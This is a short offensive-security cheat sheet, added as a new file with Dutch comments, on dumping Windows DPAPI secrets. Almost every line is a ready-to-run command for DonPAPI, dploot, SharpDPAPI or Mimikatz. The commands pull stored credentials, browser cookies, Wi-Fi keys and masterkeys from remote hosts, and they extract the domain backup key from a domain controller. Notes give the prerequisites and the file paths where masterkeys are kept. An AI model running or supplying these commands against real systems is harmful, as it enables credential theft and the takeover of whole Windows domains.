@@ -1,0 +1,47 @@
+# DPAPI Secret Dumping — Decrypt Windows Data Protection API secrets
+# DPAPI beschermt wachtwoorden, certificaten, Wi-Fi keys en browser data
+# Met de domain backup key kun je ALLE user secrets decrypten
+#
+# === Vereisten ===
+# - Local admin op doelwit (voor user secrets)
+# - Domain Admin / DCSync voor domain backup key
+#
+# === Voorbeelden ===
+
+# DonPAPI - Automatisch alle DPAPI secrets van remote hosts
+python3 DonPAPI.py DOMAIN/USER:'PASS'@TARGET_IP
+
+# DonPAPI - Meerdere hosts
+python3 DonPAPI.py DOMAIN/USER:'PASS'@targets.txt
+
+# dploot - DPAPI loot van remote host
+python3 dploot triage -u USER -p 'PASS' -d DOMAIN TARGET_IP
+
+# dploot - Specifiek credentials ophalen
+python3 dploot credentials -u USER -p 'PASS' -d DOMAIN TARGET_IP
+
+# dploot - Browser cookies
+python3 dploot cookies -u USER -p 'PASS' -d DOMAIN TARGET_IP
+
+# dploot - Domain backup key ophalen (DA nodig)
+python3 dploot backupkey -u ADMIN -p 'PASS' -d DOMAIN DC_IP
+
+# SharpDPAPI - Triage alle credentials
+.\SharpDPAPI.exe triage
+
+# SharpDPAPI - Met domain backup key
+.\SharpDPAPI.exe masterkeys /pvk:domain_backup_key.pvk
+.\SharpDPAPI.exe credentials /pvk:domain_backup_key.pvk
+
+# SharpDPAPI - Machine DPAPI secrets (certificaten, Wi-Fi)
+.\SharpDPAPI.exe machinetriage
+
+# Mimikatz - DPAPI masterkey decryptie
+mimikatz.exe "dpapi::masterkey /in:masterkey_file /rpc" exit
+
+# Domain backup key extractie via Mimikatz
+mimikatz.exe "lsadump::backupkeys /system:DC_IP /export" exit
+
+# Noot: DPAPI masterkeys staan in %APPDATA%\Microsoft\Protect\{SID}\
+# Noot: Domain backup key kan ALLE user masterkeys decrypten
+# Noot: Credential Manager, browser wachtwoorden, Wi-Fi keys — alles via DPAPI
